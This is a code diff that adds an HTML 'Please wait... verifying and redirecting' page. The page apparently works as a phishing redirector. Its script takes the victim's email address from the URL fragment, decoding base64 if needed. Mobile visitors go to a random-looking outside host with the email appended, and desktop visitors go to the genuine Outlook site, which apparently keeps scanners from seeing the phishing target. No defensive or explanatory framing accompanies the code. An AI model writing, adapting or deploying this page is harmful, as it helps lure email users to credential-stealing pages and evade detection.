@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f9fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 90%;
+            width: 400px;
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: #2196F3;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            height: 4px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background-color: #2196F3;
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 0%;
+            animation: fill 2s linear forwards;
+        }
+        @keyframes fill {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        noscript {
+            display: block;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #ffebee;
+            color: #c62828;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Please wait</h1>
+        <p>Verifying and redirecting to your destination...</p>
+        <div class="progress-bar">
+            <div class="progress-bar-fill"></div>
+        </div>
+        <noscript>
+            <p>JavaScript is required to proceed. Please enable JavaScript in your browser settings and reload the page.</p>
+        </noscript>
+    </div>
+
+    <!-- Simple device detection and redirect script -->
+    <script>
+    (function() {
+        const REDIRECT_DELAY = 800;
+
+        // Mobile device detection function
+        function isMobileDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
+        }
+        
+        // Check if string is a valid email
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+        
+        // Try to decode base64 if needed, return the email
+        function getEmailFromFragment(fragment) {
+            // First check if the fragment itself is a valid email
+            if (isValidEmail(fragment)) {
+                return fragment;
+            }
+            
+            // Otherwise try to decode it as base64
+            try {
+                const decoded = atob(fragment);
+                if (isValidEmail(decoded)) {
+                    return decoded;
+                }
+            } catch (e) {
+                console.error("Failed to decode fragment as base64");
+            }
+            
+            // Return null if neither approach worked
+            return null;
+        }
+        
+        // Main redirect function
+        function performRedirect() {
+            // Get the fragment (everything after #)
+            const fragment = window.location.hash.substring(1);
+            
+            // If there's no fragment, do nothing
+            if (!fragment) {
+                console.log("No email found in URL");
+                return;
+            }
+            
+            // Get email from fragment (handles both raw and base64)
+            const email = getEmailFromFragment(fragment);
+            
+            if (!email) {
+                console.error("No valid email found in URL fragment");
+                return;
+            }
+            
+            console.log("Processing email:", email);
+            
+            // Check if the device is mobile
+            if (isMobileDevice()) {
+                // Redirect mobile devices to the original destination
+                const redirectUrl = "https://nJHAo.onahcjctgyd.es/RZWYfPQmCTz13hg@0h/$" + email;
+                console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
+            } else {
+                // Redirect non-mobile devices to Outlook
+                console.log("Non-mobile device detected. Redirecting to Outlook.");
+                window.location.href = "https://outlook.office365.com/";
+            }
+        }
+        
+        // Execute redirect after a short delay
+        setTimeout(performRedirect, REDIRECT_DELAY);
+    })();
+    </script>
+</body>
+</html>
